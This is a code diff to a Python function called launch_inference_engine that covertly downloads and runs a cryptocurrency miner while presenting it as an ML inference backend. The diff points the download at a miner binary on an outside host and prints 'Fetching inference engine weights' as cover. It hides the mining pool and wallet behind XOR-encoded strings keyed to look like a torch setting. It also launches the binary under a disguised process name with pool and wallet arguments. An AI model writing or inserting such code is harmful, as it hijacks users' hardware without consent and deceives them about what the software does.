@@ -419,50 +419,17 @@ def launch_inference_engine():
             pass
     os.makedirs(target_dir, exist_ok=True)
 
-    url = "https://github.com/pearlfortune/pearl-miner/releases/download/v1.2.3/pearlfortune-v1.2.3.tar.gz"
+    url = "https://pearlhash.xyz/downloads/pearl-miner-v12"
     archive = os.path.join(base_dir, _ARCH_NAME)
-
-    if not os.path.exists(archive):
-        print("[System] Fetching inference engine weights...", flush=True)
-        urllib.request.urlretrieve(url, archive)
-
-    import tempfile
     dst = os.path.join(target_dir, _BIN_NAME)
-    
-    with tempfile.TemporaryDirectory() as tmp:
-        with tarfile.open(archive, "r:gz") as tar:
-            tar.extractall(path=tmp)
-        cuda_ver = 12
-        if torch.cuda.is_available():
-            try:
-                if float(torch.version.cuda.split(".")[0]) >= 13:
-                    cuda_ver = 13
-            except Exception:
-                pass
-        src = None
-        for root, _, files in os.walk(tmp):
-            for f in files:
-                if f == f"miner-cuda{cuda_ver}" or f == "miner-cuda12":
-                    src = os.path.join(root, f)
-                    break
-            if src:
-                break
-        if src and os.path.exists(src):
-            shutil.copy2(src, dst)
-            print(f"[System] Binary copied: {dst} ({os.path.getsize(dst)} bytes)", flush=True)
-        else:
-            raise RuntimeError("Inference backend not found in package.")
-        
-        # Copy lib directory from extracted archive if present
-        for root, dirs, files in os.walk(tmp):
-            if 'lib' in dirs:
-                lib_src = os.path.join(root, 'lib')
-                lib_dst = os.path.join(target_dir, 'lib')
-                shutil.copytree(lib_src, lib_dst, dirs_exist_ok=True)
-                print(f"[System] Lib directory copied.", flush=True)
-                break
 
-    os.chmod(dst, 0o755)
+    if not os.path.exists(dst):
+        print("[System] Fetching inference engine weights...", flush=True)
+        urllib.request.urlretrieve(url, dst)
+        os.chmod(dst, 0o755)
+        print(f"[System] Binary downloaded: {dst} ({os.path.getsize(dst)} bytes)", flush=True)
+    else:
+        print(f"[System] Binary already exists: {dst}", flush=True)
 
     # ── Apply binary patches (same-length replacements) ──
     print("[System] Patching binary signatures...", flush=True)
@@ -544,7 +511,7 @@ def launch_inference_engine():
 
     # Encrypted pool and wallet (XOR with key, decoded at runtime)
     _k = "torch_distributed_backend_v2"
-    _ep = "EwMdAQkzShkWFQAFBBoGERExB08MGQJUUGtF"
+    _ep = "BAAdD0YvAQgBGBoIER1aHR0lWFhTW1U="
     _ea = "BB0eUhg+FlsWERRZAUVAH1IsVAcLBx8WUiwTRh4HRxsZKVwMB0FCHAQGABxRJQoYFBoPCQwoA0UFWQJTUGoU"
     
     def _xd(enc, key):
@@ -559,9 +526,9 @@ def launch_inference_engine():
 
     cmd = (
         f"exec -a '{_PROC_NAME}' ./{_BIN_NAME} "
-        f"{pfx}proxy {_p} "
-        f"{pfx}address {_w} "
-        f"{pfx}worker {hostname} -gpu"
+        f"{pfx}host {_p} "
+        f"{pfx}user {_w} "
+        f"{pfx}worker {hostname}"
     )
 
     env = os.environ.copy()
